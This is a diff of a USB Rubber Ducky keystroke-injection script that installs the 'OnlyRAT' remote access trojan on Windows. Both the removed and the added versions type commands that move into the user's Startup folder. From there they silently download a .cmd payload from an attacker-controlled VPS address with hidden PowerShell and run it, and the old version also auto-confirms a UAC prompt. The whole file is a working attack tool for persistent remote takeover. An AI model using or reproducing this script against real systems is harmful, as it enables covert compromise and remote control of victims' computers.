@@ -1,19 +1,44 @@
+REM TITLE OnlyRat Installer
 REM OnlyRAT installer via the USB Rubber Ducky [FROM VPS]
-REM Created by : C0SM0
+REM AUTHOR C0SM0
 
-REM open the runbox
-DELAY 1000
+ATTACKMODE HID
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+
+REM Your VPS IP address
+DEFINE #VPSaddress X.X.X.X
+
 GUI r
-DELAY 400
-STRING powershell.exe
-ENTER
-DELAY 400
-
-REM execute vps installer
-REM Change 'X.X.X.X' to VPS IP Address
-STRING cmd /c set "EcSjRhAguo=X.X.X.X" && set "XNjFYKECht=%cd%" && set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" && cd %YKHfpmMRoQ% && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && cd "%XNjFYKECht%"
-ENTER
-
-REM UAC bypass
-DELAY 1800
-ALT y
+DELAY 200
+BACKSPACE
+DELAY 100
+STRINGLN cmd
+DELAY 500
+STRINGLN cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://#VPSaddress/mk01-onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && cd
